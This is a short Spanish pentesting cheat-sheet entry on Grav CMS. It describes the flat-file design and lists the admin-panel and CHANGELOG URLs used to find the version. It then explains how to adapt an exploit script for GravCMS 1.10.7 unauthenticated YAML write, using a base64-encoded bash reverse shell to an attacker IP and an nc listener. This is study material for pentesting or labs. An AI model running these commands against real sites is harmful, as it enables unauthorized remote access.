# Grav 

Tags: #Grav 

**Grav** es un CMS (Content Management System) plano — "flat-file CMS" — escrito en PHP. La diferencia clave frente a WordPress, Joomla o Drupal es que **no usa base de datos**: todo el contenido (páginas, configuración, usuarios) se guarda directamente en archivos de texto, principalmente:

- **Markdown** (`.md`) para el contenido de las páginas
- **YAML** (`.yaml`) para configuración, datos de usuarios, blueprints de plugins, etc.
- **Twig** para las plantillas/temas (mismo motor de templates que usa Symfony)


```bash 
http://IP/grav-admin/admin     # Panel de login del CMS 
http://IP/admin
```

```bash 
# Archivos con la versión 
http://IP/grav-admin/CHANGELOG.md   
```

## GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2) 

```bash 
❯ python grav.py

Modificaciones:
	❯ echo -ne "bash -i >& /dev/tcp/IP_Kali/4444 0>&1" | base64 -w0   # Crear la revershell en baase64 para el script 
	# target= "http://IP/grav-admin"    # Colocar la ruta del panel de login 
	# r = s.get(target+"/admin")        # Tener en cuenta que se le agrega este /admin al final del target 
```

```bash 
❯ rlwrap nc -nlvp 4444   # Recibir la revershell  
```